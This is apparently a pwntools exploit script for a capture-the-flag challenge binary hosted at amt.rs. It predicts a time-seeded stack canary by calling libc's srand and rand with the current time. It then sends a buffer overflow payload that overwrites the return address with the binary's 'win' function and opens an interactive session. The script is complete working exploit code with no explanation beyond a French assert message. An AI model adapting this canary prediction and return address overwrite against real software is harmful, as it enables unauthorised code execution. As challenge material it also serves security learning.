#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from ctypes import CDLL
from math import floor

exe = context.binary = ELF('chal')
libc = CDLL("libc.so.6")

host = args.HOST or 'amt.rs'
port = int(args.PORT or 31175)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

context.terminal = ['xfce4-terminal','-e']
gdbscript = '''
tbreak main
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()
now = int(floor(time.time()))
libc.srand(now)

canary = libc.rand()
test = libc.rand()

io.sendlineafter(b'3) Exit\n',b'1')
test2 = int(io.recvline())

assert test == test2, "Le PRNG n'est pas bien config"

io.sendlineafter(b'3) Exit\n',b'2')

OFFSET = 0x30+8

p = b'A'*40
p += p32(canary)*2
p += b'B'*(OFFSET - len(p))
p += p64(exe.sym['win'])
io.sendlineafter(b'your guess: ', p)

io.interactive()

